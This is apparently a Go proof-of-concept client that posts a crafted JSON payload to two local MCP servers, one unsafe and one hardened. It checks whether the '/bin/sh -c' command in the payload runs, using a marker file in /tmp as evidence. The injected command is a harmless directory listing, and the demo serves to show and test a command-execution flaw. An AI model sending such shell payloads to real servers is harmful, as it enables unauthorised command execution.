// MCP CLIENT DEMO (Go)
// Sends a crafted payload to the target MCP server (unsafe or safe)
// Demonstrates OS command execution (unsafe) or rejection (safe)
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"time"
)

type RunRequest struct {
	Command string   `json:"command"`
	Args    []string `json:"args"`
}

const marker = "/tmp/mcp_poc_ls.txt"

func testServer(url string, payload RunRequest, markerExpected bool) {
	if _, err := os.Stat(marker); err == nil {
		os.Remove(marker)
	}
	b, _ := json.Marshal(payload)
	resp, err := http.Post(url, "application/json", bytes.NewReader(b))
	if err != nil {
		fmt.Println("POST error:", err)
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Printf("POST %s with payload: %+v\n", url, payload)
	fmt.Println("Response:", resp.StatusCode, string(body))
	// Give the OS a moment to write the file
	time.Sleep(1 * time.Second)
	if markerExpected {
		if _, err := os.Stat(marker); err == nil {
			fmt.Printf("✓ Marker file created: %s\n", marker)
		} else {
			fmt.Printf("✗ Marker file NOT created: %s\n", marker)
		}
	} else {
		if _, err := os.Stat(marker); err == nil {
			fmt.Printf("✗ Marker file should NOT exist, but found: %s\n", marker)
		} else {
			fmt.Printf("✓ Marker file not created as expected.\n")
		}
	}
}

func main() {
	payload := RunRequest{
		Command: "/bin/sh",
		Args:    []string{"-c", "ls -lrth / > /tmp/mcp_poc_ls.txt"},
	}
	allowedPayload := RunRequest{
		Command: "ls",
		Args:    []string{"-lrth", "/"},
	}
	fmt.Println("--- Testing UNSAFE Go MCP server ---")
	testServer("http://127.0.0.1:6005/run", payload, true)
	fmt.Println("\n--- Testing SAFE Go MCP server ---")
	testServer("http://127.0.0.1:6006/run", payload, false)
	fmt.Println("\n--- Testing SAFE Go MCP server with allowed payload ---")
	testServer("http://127.0.0.1:6006/run", allowedPayload, false)
}
